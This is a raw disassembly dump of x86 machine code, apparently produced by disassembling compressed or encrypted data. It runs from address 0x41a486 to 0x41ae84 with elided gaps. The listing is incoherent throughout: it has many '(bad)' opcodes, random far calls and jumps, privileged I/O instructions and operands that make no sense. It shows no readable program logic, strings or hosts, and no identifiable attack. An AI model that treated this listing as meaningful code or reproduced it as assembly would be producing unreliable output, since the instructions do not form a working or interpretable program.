  41a486:	and    al,0x84
  41a488:	mov    al,ds:0xa28bf3d8
  41a48d:	div    DWORD PTR [ebx+edx*4+0x0]
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	sub    esp,DWORD PTR [ecx]
  41a502:	(bad)  
  41a503:	hlt    
  41a504:	in     al,dx
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	addr16 cli 
  41a50e:	or     esi,ebx
  41a510:	aas    
  41a511:	retf   
  41a512:	or     dl,al
  41a514:	js     0x41a505
  41a516:	add    BYTE PTR [ebx+0x7],bh
  41a519:	cmc    
  41a51a:	ret    
  41a51b:	cmp    al,0xe6
  41a51d:	int    0xbc
  41a51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a520:	loopne 0x41a541
  41a522:	or     al,0xd
  41a524:	loope  0x41a599
  41a526:	adc    ebx,DWORD PTR [ebx+0x45]
  41a529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a52a:	mov    esp,DWORD PTR [edx]
  41a52c:	lods   al,BYTE PTR ds:[esi]
  41a52d:	and    DWORD PTR [ebx-0x157f6cd8],esp
  41a533:	jp     0x41a4c8
  41a535:	loope  0x41a5b5
  41a537:	sub    dl,BYTE PTR [edx]
  41a539:	popa   
  41a53a:	pop    di
  41a53c:	in     eax,dx
  41a53d:	cmp    BYTE PTR [esi-0x7f],0x87
  41a541:	shl    DWORD PTR [edi+0x20],1
  41a544:	pop    ecx
  41a545:	call   0x72c4:0x12293ccf
  41a54c:	fld    DWORD PTR [ebx-0x76227dc0]
  41a552:	aad    0x85
  41a554:	out    dx,al
  41a555:	cdq    
  41a556:	lds    ebp,FWORD PTR [edi-0x6]
  41a559:	mov    WORD PTR [ecx],cs
  41a55b:	(bad)
  41a560:	and    esp,ecx
  41a562:	leave  
  41a563:	mov    al,0x74
  41a565:	dec    eax
  41a566:	into   
  41a567:	adc    ch,dh
  41a569:	and    DWORD PTR [edi],ebx
  41a56b:	jecxz  0x41a582
  41a56d:	sub    dl,ah
  41a56f:	rcl    BYTE PTR [ecx+eax*1+0x41],1
  41a573:	scas   eax,DWORD PTR es:[edi]
  41a574:	push   ebp
  41a575:	jge    0x41a4ff
  41a577:	add    BYTE PTR [ecx],0xd9
  41a57a:	cmp    al,0x81
  41a57c:	adc    al,ch
  41a57e:	mul    BYTE PTR [ebx-0x70a61eb2]
  41a584:	js     0x41a5bb
  41a586:	test   al,0xec
  41a588:	test   BYTE PTR [eax*4+0x462a905],dh
  41a58f:	inc    edx
  41a590:	pop    ecx
  41a591:	inc    edi
  41a592:	or     ecx,ebp
  41a594:	pop    edx
  41a595:	ror    DWORD PTR [edx-0x51c18933],0x9b
  41a59c:	mov    BYTE PTR [ecx],ch
  41a59e:	inc    edi
  41a59f:	stos   BYTE PTR es:[edi],al
  41a5a0:	inc    ecx
  41a5a1:	mov    edx,0xa227ec68
  41a5a6:	adc    BYTE PTR [ecx-0x17],al
  41a5a9:	mov    ch,0x2b
  41a5ab:	scas   al,BYTE PTR es:[edi]
  41a5ac:	push   ebx
  41a5ad:	jmp    0x41a5db
  41a5af:	in     eax,0xc1
  41a5b1:	test   al,0x2b
  41a5b3:	test   DWORD PTR [eax+0x2c23cf64],edx
  41a5b9:	shl    DWORD PTR [eax-0x4c],0x20
  41a5bd:	sub    DWORD PTR [ecx],esi
  41a5bf:	cdq    
  41a5c0:	ds jbe 0x41a61e
  41a5c3:	js     0x41a5a3
  41a5c5:	stos   BYTE PTR es:[edi],al
  41a5c6:	or     al,0x5a
  41a5c8:	imul   ebx,DWORD PTR [eax+0x45],0x841ba3e6
  41a5cf:	dec    eax
  41a5d0:	shr    DWORD PTR [edi+0x2810e0c1],0x76
  41a5d7:	mov    cs,WORD PTR [edx+0x16]
  41a5da:	cwde   
  41a5db:	ins    DWORD PTR es:[edi],dx
  41a5dc:	adc    ebx,DWORD PTR [edx+ebp*8]
  41a5df:	int3   
  41a5e0:	sbb    DWORD PTR [edx-0x55bed757],esi
  41a5e6:	push   es
  41a5e7:	inc    esi
  41a5e8:	add    BYTE PTR [esi],0x5c
  41a5eb:	add    ah,ah
  41a5ed:	stos   DWORD PTR es:[edi],eax
  41a5ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5ef:	push   cs
  41a5f0:	test   esi,esp
  41a5f2:	fnstsw WORD PTR [eax+ebx*4+0x46fb10a8]
  41a5f9:	inc    esp
  41a5fa:	(bad)  
  41a5fb:	repnz pop esp
  41a5fd:	cwd    
  41a5ff:	xor    BYTE PTR [ebx-0x3296d8b2],0x3
  41a606:	pushf  
  41a607:	sub    ebx,ecx
  41a609:	into   
  41a60a:	mov    BYTE PTR [edx],bl
  41a60c:	lahf   
  41a60d:	hlt    
  41a60e:	inc    eax
  41a60f:	or     eax,0x0
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x2316a625
  41a682:	mov    ah,0x6e
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	data16 mov cl,BYTE PTR fs:[ecx+0x433d6297]
  41a694:	sbb    DWORD PTR [eax-0x2b],0xfb6715a7
  41a69b:	retf   
  41a69c:	add    DWORD PTR [ebx-0x2a7d2961],edi
  41a6a2:	and    al,0x42
  41a6a4:	data16 fucomp st(7)
  41a6a7:	(bad)  
  41a6a8:	rcl    dl,1
  41a6aa:	push   cs
  41a6ab:	cli    
  41a6ac:	loop   0x41a6f3
  41a6ae:	pop    ebx
  41a6af:	sub    DWORD PTR [edi-0x7a],esi
  41a6b2:	fcomp  DWORD PTR [edi-0x50]
  41a6b5:	xor    ebp,DWORD PTR [ebp-0x62]
  41a6b8:	sub    BYTE PTR [ebx-0x25],dh
  41a6bb:	sbb    eax,edi
  41a6bd:	mov    ds:0xdd4c7180,eax
  41a6c2:	dec    edx
  41a6c3:	mov    dh,0x8
  41a6c5:	sar    BYTE PTR [ecx+0x114289ac],0xe4
  41a6cc:	jbe    0x41a749
  41a6ce:	push   ss
  41a6cf:	mov    ah,0x44
  41a6d1:	xchg   esi,eax
  41a6d2:	or     eax,DWORD PTR [edi+0x45f3237]
  41a6d8:	int3   
  41a6d9:	adc    BYTE PTR [ebx+0x66],0x84
  41a6dd:	push   edi
  41a6de:	xlat   BYTE PTR ds:[ebx]
  41a6df:	out    0x92,eax
  41a6e1:	popa   
  41a6e2:	and    DWORD PTR [esi-0x22],ecx
  41a6e5:	mov    esi,0x8abbffaf
  41a6ea:	cld    
  41a6eb:	pop    esi
  41a6ec:	repz dec esi
  41a6ee:	sbb    BYTE PTR [ebx-0x30],0x44
  41a6f2:	imul   eax,DWORD PTR [ebx+0x200802c5],0x719b5147
  41a6fc:	mov    ah,0x93
  41a6fe:	jns    0x41a6fe
  41a700:	ins    DWORD PTR es:[edi],dx
  41a701:	imul   ebp,DWORD PTR [edx+0x4deeddce],0x8c3f0205
  41a70b:	cmp    esp,DWORD PTR [eax+ebx*1+0x42]
  41a70f:	(bad)  [edi-0x54fd6216]
  41a715:	jmp    0x3998:0xc8847637
  41a71c:	les    eax,FWORD PTR [edi-0x579cb2b2]
  41a722:	fist   WORD PTR [esi]
  41a724:	stos   DWORD PTR es:[edi],eax
  41a725:	js     0x41a797
  41a727:	xor    eax,0xebeba2d9
  41a72c:	mov    ecx,0xf0751ac2
  41a731:	pop    esi
  41a732:	popf   
  41a733:	aas    
  41a734:	jno    0x41a799
  41a736:	rcl    BYTE PTR [ecx+ebp*1],cl
  41a739:	and    ch,bh
  41a73b:	sub    al,BYTE PTR [ebp-0x6185d746]
  41a741:	into   
  41a742:	pop    ebp
  41a743:	dec    eax
  41a744:	pop    ss
  41a745:	dec    ebx
  41a746:	lods   eax,DWORD PTR ds:[esi]
  41a747:	adc    al,0x9e
  41a749:	lds    ecx,FWORD PTR [ecx-0x2ea135f5]
  41a74f:	add    eax,0x282653b4
  41a754:	inc    edx
  41a755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a756:	adc    al,0xaf
  41a758:	shl    edi,0x8e
  41a75b:	bound  ecx,QWORD PTR [ebp-0x30f13573]
  41a761:	in     al,dx
  41a762:	push   ss
  41a763:	lahf   
  41a764:	dec    edx
  41a765:	dec    edi
  41a766:	stc    
  41a767:	xchg   ecx,eax
  41a769:	test   eax,0x656e02f9
  41a76e:	push   esp
  41a76f:	not    BYTE PTR [edx+esi*8-0x60]
  41a773:	jmp    0x43bb:0xcebd2331
  41a77a:	mov    ecx,0x133c32fd
  41a77f:	int3   
  41a780:	and    bl,BYTE PTR [eax-0x65]
  41a783:	sub    eax,0xafb53c90
  41a788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a789:	mov    ebx,0x38d6ffbe
  41a78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a78f:	push   ss
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x6f5327ca,al
  41a801:	cs ret 0xf415
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	adc    al,bl
  41a80e:	cmp    esi,eax
  41a810:	or     dh,al
  41a812:	jg     0x41a82d
  41a814:	rol    BYTE PTR [esi],0x1b
  41a817:	sub    eax,0xb5c8b59e
  41a81c:	jle    0x41a7a3
  41a81e:	mov    edx,0x23b275c4
  41a823:	(bad)  
  41a824:	mov    al,ds:0xfd74c4e1
  41a829:	std    
  41a82a:	jno    0x41a7f2
  41a82c:	out    0x5,eax
  41a82e:	fdivr  DWORD PTR ds:0xcb204fbc
  41a834:	xchg   ecx,eax
  41a835:	dec    edx
  41a836:	dec    ecx
  41a837:	mov    esp,0xbafd089d
  41a83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a83d:	xchg   esi,eax
  41a83e:	push   cs
  41a83f:	or     edi,DWORD PTR [esi-0x40]
  41a842:	jge    0x41a8a9
  41a844:	enter  0x7ca5,0x5a
  41a848:	int    0xd5
  41a84a:	rol    BYTE PTR [ecx+0x3e],1
  41a84d:	add    esp,DWORD PTR [eax-0x63]
  41a850:	(bad)  
  41a851:	fsub   DWORD PTR [eax]
  41a853:	repnz mov WORD PTR [ebx],ds
  41a856:	outs   dx,BYTE PTR ds:[esi]
  41a857:	jno    0x41a820
  41a859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a85a:	test   al,0x14
  41a85c:	xchg   ecx,eax
  41a85d:	pop    ss
  41a85e:	es adc eax,esp
  41a861:	ret    0x18b2
  41a864:	call   0xc41d:0x13da7a09
  41a86b:	fmul   QWORD PTR [edi+0x3a]
  41a86e:	jp     0x41a7f6
  41a870:	adc    eax,0x36297c51
  41a875:	mov    bh,0x15
  41a877:	hlt    
  41a878:	sub    BYTE PTR [esi],al
  41a87a:	fdivr  QWORD PTR [ebx+0x7dd1e9e4]
  41a880:	mov    fs,WORD PTR [ecx+0x5e855f42]
  41a886:	jmp    0x41a809
  41a888:	sbb    edi,edx
  41a88a:	xor    BYTE PTR [eax+0x7f85d6e],ah
  41a890:	adc    BYTE PTR [ebx-0x5941f7c5],ch
  41a896:	or     eax,DWORD PTR [ebx]
  41a898:	and    DWORD PTR [edi],ebp
  41a89a:	(bad)  
  41a89b:	lock cmp ecx,DWORD PTR ss:[esi]
  41a89f:	sub    ecx,DWORD PTR [ebp+esi*2-0x1b]
  41a8a3:	in     eax,0xbf
  41a8a5:	or     BYTE PTR [ecx+eax*4-0x50],cl
  41a8a9:	dec    esp
  41a8aa:	cwde   
  41a8ab:	mov    esp,0x9b5faa
  41a8b0:	jns    0x41a85f
  41a8b2:	(bad)  
  41a8b3:	ds out 0xb4,al
  41a8b6:	jns    0x41a8cd
  41a8b8:	rcl    DWORD PTR [ecx+eiz*4-0x2124a53c],1
  41a8bf:	out    0x3e,eax
  41a8c1:	sub    ebp,DWORD PTR [ebx+0x40]
  41a8c4:	das    
  41a8c5:	call   0xa01e96eb
  41a8ca:	mov    ch,0x11
  41a8cc:	jnp    0x41a8b6
  41a8ce:	mov    esi,0x7f149f4
  41a8d3:	fdivr  st,st(5)
  41a8d5:	ret    0x673c
  41a8d8:	push   0xffffff9e
  41a8da:	jbe    0x41a87d
  41a8dc:	cmp    BYTE PTR [ecx-0x2bf9bf58],0xb9
  41a8e3:	loopne 0x41a91a
  41a8e5:	pushf  
  41a8e6:	xchg   ebp,eax
  41a8e7:	mov    ebp,0xb589cd14
  41a8ec:	jno    0x41a96d
  41a8ee:	inc    ebp
  41a8ef:	push   esp
  41a8f0:	pop    ss
  41a8f1:	enter  0x68d,0xa0
  41a8f5:	retf   0xd707
  41a8f8:	cwde   
  41a8f9:	and    DWORD PTR [edx],ebp
  41a8fb:	ret    0xe375
  41a8fe:	test   eax,0x9b6477d8
  41a903:	call   0x926:0x56c84370
  41a90a:	push   ecx
  41a90b:	dec    ecx
  41a90c:	pop    es
  41a90d:	jmp    0x0:0x6f6b
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	icebp  
  41a981:	dec    esi
  41a982:	sbb    DWORD PTR [edi],edi
  41a984:	clc    
  41a985:	sbb    DWORD PTR [ecx],eax
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	mov    ecx,0x75884def
  41a991:	push   DWORD PTR [eax-0x2045f119]
  41a997:	xchg   ecx,eax
  41a998:	loopne 0x41a928
  41a99a:	or     BYTE PTR [eax],dh
  41a99c:	inc    ebp
  41a99d:	das    
  41a99e:	loope  0x41a9f3
  41a9a0:	nop
  41a9a1:	jbe    0x41a93c
  41a9a3:	xchg   ecx,eax
  41a9a4:	or     BYTE PTR [ebp+edx*1+0x17de9d5],bh
  41a9ab:	repz sbb BYTE PTR [edx-0x3b],ah
  41a9af:	and    esi,DWORD PTR ds:0x68193e7b
  41a9b5:	adc    eax,0x680eb2b3
  41a9ba:	or     BYTE PTR [esi-0x1a86976c],dh
  41a9c0:	xchg   edi,eax
  41a9c1:	mov    esi,0xfd08b006
  41a9c6:	dec    edx
  41a9c7:	xchg   DWORD PTR [ebp+edi*4+0x1],edx
  41a9cb:	jns    0x41aa31
  41a9cd:	xchg   BYTE PTR [eax],al
  41a9cf:	pusha  
  41a9d0:	push   ebp
  41a9d1:	pop    ds
  41a9d2:	xchg   ebx,eax
  41a9d3:	adc    ch,BYTE PTR [esi+0x3f5d5359]
  41a9d9:	(bad)  
  41a9da:	icebp  
  41a9db:	retf   0x4eaf
  41a9de:	add    al,0x5
  41a9e0:	pop    ss
  41a9e1:	sub    dl,BYTE PTR [esi+0xb]
  41a9e4:	(bad)  
  41a9e5:	sub    DWORD PTR [esi],eax
  41a9e7:	adc    esi,ecx
  41a9e9:	xchg   ebx,eax
  41a9ea:	jecxz  0x41a9ca
  41a9ec:	icebp  
  41a9ed:	leave  
  41a9ee:	sub    eax,0x908787eb
  41a9f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f4:	fstp   st(0)
  41a9f6:	pop    eax
  41a9f7:	jno    0x41aa37
  41a9f9:	dec    ebx
  41a9fa:	dec    esi
  41a9fb:	call   0xfadd76fd
  41aa00:	mov    dh,0x7c
  41aa02:	std    
  41aa03:	sub    BYTE PTR [ebx],dh
  41aa05:	sbb    al,0x98
  41aa07:	inc    edx
  41aa08:	sahf   
  41aa09:	imul   edx,DWORD PTR [edi],0xffffff96
  41aa0c:	call   0x37283452
  41aa11:	cmp    ebp,DWORD PTR [ecx-0x2]
  41aa14:	aam    0x52
  41aa16:	fidiv  DWORD PTR [edx]
  41aa18:	or     eax,0xcbd18653
  41aa1d:	dec    ecx
  41aa1e:	sbb    al,0xe8
  41aa20:	mov    eax,0x376b75d6
  41aa25:	xchg   ebp,eax
  41aa26:	xlat   BYTE PTR ds:[ebx]
  41aa27:	sti    
  41aa28:	aaa    
  41aa29:	rcr    DWORD PTR [esi+ebx*4+0x4d],cl
  41aa2d:	xchg   edx,eax
  41aa2e:	sub    BYTE PTR [ebx-0x65a186e1],ah
  41aa34:	shr    esi,0x0
  41aa37:	add    edi,DWORD PTR [ebp+0x7003fc31]
  41aa3d:	outs   dx,DWORD PTR ds:[esi]
  41aa3e:	jmp    0x86cb6dd6
  41aa43:	dec    esi
  41aa44:	jle    0x41aa77
  41aa46:	pop    ebx
  41aa47:	adc    BYTE PTR [esp+ebp*2-0x7d],dl
  41aa4b:	dec    esi
  41aa4c:	stc    
  41aa4d:	outs   dx,BYTE PTR ds:[esi]
  41aa4e:	lods   eax,DWORD PTR ds:[esi]
  41aa4f:	adc    al,0x79
  41aa51:	jmp    0xca3a:0xa3ca81fa
  41aa58:	push   ds
  41aa59:	add    bl,dl
  41aa5b:	jp     0x41aa9c
  41aa5d:	popf   
  41aa5e:	std    
  41aa5f:	cmp    edx,DWORD PTR [esi-0x7acc755b]
  41aa65:	add    ecx,esp
  41aa67:	mov    edi,0x67b71f7d
  41aa6c:	push   eax
  41aa6d:	cmp    al,bl
  41aa6f:	xchg   edx,eax
  41aa70:	mov    ds:0xb4d61628,eax
  41aa75:	pop    ebp
  41aa76:	mov    cl,bl
  41aa78:	adc    dh,BYTE PTR [edi+0x5a]
  41aa7b:	div    DWORD PTR [eax-0x60683968]
  41aa81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa82:	lds    edi,FWORD PTR [ecx+0x45]
  41aa85:	into   
  41aa86:	and    eax,0x3b59e5f4
  41aa8b:	mul    BYTE PTR [esi-0x10]
  41aa8e:	xchg   esp,eax
  41aa8f:	cmp    eax,0x0
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	sbb    ebp,edi
  41ab02:	jge    0x41ab10
  41ab04:	cld    
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	xor    eax,DWORD PTR [ecx+eax*1-0x59a27500]
  41ab13:	rol    DWORD PTR [ebx],cl
  41ab15:	inc    edx
  41ab16:	call   0xfc72:0x77591654
  41ab1d:	or     BYTE PTR [eax+0x286ee7fb],ah
  41ab23:	adc    bh,BYTE PTR [esp+ebp*8+0x137bb1c7]
  41ab2a:	(bad)  
  41ab2b:	sbb    BYTE PTR [esi],ah
  41ab2d:	push   edx
  41ab2e:	adc    eax,0x4f7b7e82
  41ab33:	shl    DWORD PTR [eax+0x5a054f75],1
  41ab39:	dec    ebx
  41ab3a:	xchg   edi,eax
  41ab3b:	jb     0x41ab95
  41ab3d:	loope  0x41aaf4
  41ab3f:	jns    0x41ab61
  41ab41:	cdq    
  41ab42:	clc    
  41ab43:	adc    ch,BYTE PTR [ebx+0x13013593]
  41ab49:	imul   eax,DWORD PTR [esi*2-0x6380552],0x1bafc9a0
  41ab54:	or     ch,bh
  41ab56:	xor    DWORD PTR [edi-0x3fc7debd],ecx
  41ab5c:	mov    ebp,DWORD PTR [ebp+0x5b]
  41ab5f:	xor    eax,0x5832ddb1
  41ab64:	lahf   
  41ab65:	push   ebx
  41ab66:	aaa    
  41ab67:	out    dx,al
  41ab68:	shr    DWORD PTR [esi],0x55
  41ab6b:	leave  
  41ab6c:	and    eax,0x2a978235
  41ab71:	addr16 dec ebx
  41ab73:	addr16 push ebx
  41ab75:	mov    ecx,0x2c4c03ef
  41ab7a:	stos   DWORD PTR es:[edi],eax
  41ab7b:	fdivr  QWORD PTR [ecx]
  41ab7d:	mov    ch,dl
  41ab7f:	rol    BYTE PTR [edx+0x4dee5f8e],0xa5
  41ab86:	clc    
  41ab87:	das    
  41ab88:	fwait
  41ab89:	cwde   
  41ab8a:	and    ebx,edi
  41ab8c:	inc    ebp
  41ab8d:	mov    WORD PTR [ecx-0x65],?
  41ab90:	add    edx,DWORD PTR [ebp+0x45]
  41ab93:	push   ebx
  41ab94:	cmp    eax,0x9324f1d7
  41ab99:	nop
  41ab9a:	cmp    al,0xde
  41ab9c:	cs mov al,0x56
  41ab9f:	test   al,0xe8
  41aba1:	sbb    eax,0x6878a486
  41aba6:	jo     0x41abee
  41aba8:	test   BYTE PTR [esi+0x53],bh
  41abab:	pop    edx
  41abac:	cld    
  41abad:	fstp   TBYTE PTR [ecx]
  41abaf:	cli    
  41abb0:	int    0x42
  41abb2:	pop    edi
  41abb3:	cs mov ecx,0xf170a276
  41abb9:	xor    bl,BYTE PTR [esi-0x2d]
  41abbc:	stos   BYTE PTR es:[edi],al
  41abbd:	adc    dh,bh
  41abbf:	stos   DWORD PTR es:[edi],eax
  41abc0:	or     eax,0xe8ea0f77
  41abc5:	popf   
  41abc6:	mov    ah,0xa5
  41abc8:	or     BYTE PTR [eax-0x2cd345dd],dl
  41abce:	in     al,0x70
  41abd0:	xchg   ebx,eax
  41abd1:	(bad)  
  41abd2:	rcr    BYTE PTR [esi-0x715a0462],1
  41abd8:	and    al,0x40
  41abda:	aas    
  41abdb:	sbb    eax,0xa1ed6b33
  41abe0:	xlat   BYTE PTR ss:[ebx]
  41abe2:	imul   ecx,DWORD PTR ds:[edi],0xffffffdd
  41abe6:	sub    BYTE PTR [edx+edi*8],0x64
  41abea:	stos   BYTE PTR es:[edi],al
  41abeb:	mov    WORD PTR [ecx-0x8],gs
  41abee:	push   cs
  41abef:	(bad)  [ebx+eax*2]
  41abf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf3:	pushf  
  41abf4:	inc    ebp
  41abf5:	fstp   DWORD PTR [edx]
  41abf7:	sbb    al,0x11
  41abf9:	xor    esi,edx
  41abfb:	ins    BYTE PTR es:[edi],dx
  41abfc:	loope  0x41ac79
  41abfe:	sub    al,0xee
  41ac00:	mov    ds:0xbef9f56e,al
  41ac05:	loopne 0x41ac64
  41ac07:	mov    eax,es
  41ac09:	mov    dh,0x39
  41ac0b:	sbb    al,0x2a
  41ac0d:	js     0x41abb6
  41ac0f:	ret    
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ebp+eiz*4+0x1b]
  41ac82:	jmp    0x41ace1
  41ac84:	add    BYTE PTR [ecx+eax*1],bl
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	imul   ebx,DWORD PTR [edx+0x4c],0x11
  41ac90:	aam    0x42
  41ac92:	add    eax,0x144bb306
  41ac97:	or     al,0x68
  41ac99:	in     al,dx
  41ac9a:	pop    ebx
  41ac9b:	cld    
  41ac9c:	je     0x41ad04
  41ac9e:	stos   BYTE PTR es:[edi],al
  41ac9f:	lods   eax,DWORD PTR ds:[esi]
  41aca0:	jnp    0x41ad1d
  41aca2:	add    bl,cl
  41aca4:	(bad)  
  41aca5:	dec    edx
  41aca6:	(bad)  
  41aca7:	out    dx,eax
  41aca8:	sbb    DWORD PTR [esi-0x7a8e0727],0xffffffcc
  41acaf:	inc    ebx
  41acb0:	and    eax,DWORD PTR [edx]
  41acb2:	inc    esi
  41acb3:	sub    DWORD PTR [ecx+0x7e],ebx
  41acb6:	inc    edi
  41acb7:	mov    fs,WORD PTR [ebx-0x2b7f533c]
  41acbd:	sub    bl,bh
  41acbf:	push   ebx
  41acc0:	push   ecx
  41acc1:	pop    eax
  41acc2:	test   ch,al
  41acc4:	(bad)
  41acc7:	bound  ecx,QWORD PTR [edi+0x36d1bc53]
  41accd:	xor    BYTE PTR ds:0xe970d962,al
  41acd3:	jge    0x41acc8
  41acd5:	outs   dx,BYTE PTR ds:[esi]
  41acd6:	xor    ebp,edx
  41acd8:	adc    bh,BYTE PTR [esi+0xc9c2d54]
  41acde:	and    eax,0x17bd85b2
  41ace3:	pusha  
  41ace4:	inc    eax
  41ace5:	cmp    eax,0x18a2a1e1
  41acea:	mov    DWORD PTR [ecx+0x28],0x2ebaa04b
  41acf1:	push   eax
  41acf2:	dec    DWORD PTR [edi+0xcd92081]
  41acf8:	test   DWORD PTR [eax-0x3fa54888],ebp
  41acfe:	cs ja  0x41ad4c
  41ad01:	iret   
  41ad02:	cmp    esp,DWORD PTR [esi-0x244de39d]
  41ad08:	xchg   esp,eax
  41ad09:	stos   DWORD PTR es:[edi],eax
  41ad0a:	loopne 0x41acb6
  41ad0c:	push   ecx
  41ad0d:	cmp    DWORD PTR [eax+edi*2],edx
  41ad10:	add    BYTE PTR [eax],al
  41ad12:	lea    eax,[ebp-0x2d825d8c]
  41ad18:	pop    eax
  41ad19:	in     eax,0x69
  41ad1b:	ds jbe 0x41accd
  41ad1e:	cmp    eax,0x336e879d
  41ad23:	out    dx,al
  41ad24:	addr16 retf 
  41ad26:	inc    BYTE PTR [eax]
  41ad28:	test   eax,0x15b455b9
  41ad2d:	loop   0x41ad41
  41ad2f:	mov    eax,DWORD PTR [ecx+0x3e7cc078]
  41ad35:	stc    
  41ad36:	ja     0x41acd0
  41ad38:	cmp    al,0x72
  41ad3a:	aaa    
  41ad3b:	vpsrad xmm7,xmm4,XMMWORD PTR [edx]
  41ad3f:	inc    esp
  41ad40:	sub    DWORD PTR [ecx+0x14],esp
  41ad43:	mov    dh,0xc9
  41ad45:	in     al,0x15
  41ad47:	aaa    
  41ad48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad49:	dec    edx
  41ad4a:	repz imul ebx,DWORD PTR [eax],0xa7b3fba
  41ad51:	xlat   BYTE PTR ds:[bx]
  41ad53:	inc    ebp
  41ad54:	mov    esi,0xc826137b
  41ad59:	mov    edx,DWORD PTR [edi+ecx*2]
  41ad5c:	ret    0xc72d
  41ad5f:	cmc    
  41ad60:	mov    eax,ds:0x386ae8d3
  41ad65:	adc    ebx,ebp
  41ad67:	jne    0x41ad9c
  41ad69:	or     al,al
  41ad6b:	dec    ebp
  41ad6c:	sar    BYTE PTR [edi+0x6919e647],0x43
  41ad73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad74:	aaa    
  41ad75:	push   ss
  41ad76:	cli    
  41ad77:	fcom   QWORD PTR [ebx-0x1f313584]
  41ad7d:	popf   
  41ad7e:	mov    DWORD PTR [ebx+0x45b3300b],esi
  41ad84:	pop    ebx
  41ad85:	out    dx,eax
  41ad86:	imul   eax,esp,0xd96d6dba
  41ad8c:	pop    eax
  41ad8d:	inc    ebx
  41ad8e:	jmp    0x0:0xb7
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edi+edx*2+0x4ddacc4],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	cmp    DWORD PTR [ecx+esi*4],esi
  41ae0f:	mov    cl,0xa6
  41ae11:	pop    edi
  41ae12:	inc    eax
  41ae13:	jo     0x41ae1b
  41ae15:	adc    ebp,DWORD PTR [ebx]
  41ae17:	mov    esi,0x9efbc4d7
  41ae1c:	add    bh,BYTE PTR ds:[eax+eiz*4+0x3a]
  41ae21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae22:	outs   dx,BYTE PTR ds:[esi]
  41ae23:	or     BYTE PTR [edi-0x2eddc6fb],dh
  41ae29:	cs iret 
  41ae2b:	xor    ebx,DWORD PTR [edx+edx*4+0x50]
  41ae2f:	mov    edx,0x19037cc7
  41ae34:	inc    edx
  41ae35:	and    ebp,eax
  41ae37:	push   ebp
  41ae38:	jo     0x41ae3e
  41ae3a:	and    esp,DWORD PTR [ebp-0x80]
  41ae3d:	pop    esi
  41ae3e:	and    DWORD PTR [eax],eax
  41ae40:	das    
  41ae41:	(bad)  
  41ae42:	in     al,dx
  41ae43:	enter  0x2378,0xbb
  41ae47:	aas    
  41ae48:	lea    ebp,ss:[ebx]
  41ae4b:	push   ss
  41ae4c:	ss add edi,ebp
  41ae4f:	out    0x2e,eax
  41ae51:	(bad)  
  41ae52:	jecxz  0x41adeb
  41ae54:	dec    ecx
  41ae55:	repnz clc 
  41ae57:	xchg   edi,eax
  41ae58:	mov    esi,0xcd5521c9
  41ae5d:	lods   eax,DWORD PTR ds:[esi]
  41ae5e:	add    eax,DWORD PTR [ebp-0x5994cc87]
  41ae64:	adc    BYTE PTR [ebx],0xce
  41ae67:	xor    ch,dh
  41ae69:	push   eax
  41ae6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae6b:	mul    bl
  41ae6d:	jmp    DWORD PTR [esi]
  41ae6f:	or     BYTE PTR [eax-0x2f],cl
  41ae72:	ds cdq 
  41ae74:	cmp    DWORD PTR [edi+0x6a858b0e],ecx
  41ae7a:	xor    eax,0x906f051f
  41ae7f:	adc    al,0x28
  41ae81:	fwait
  41ae82:	out    0x1d,eax
  41ae84:	call   0x58688d1b
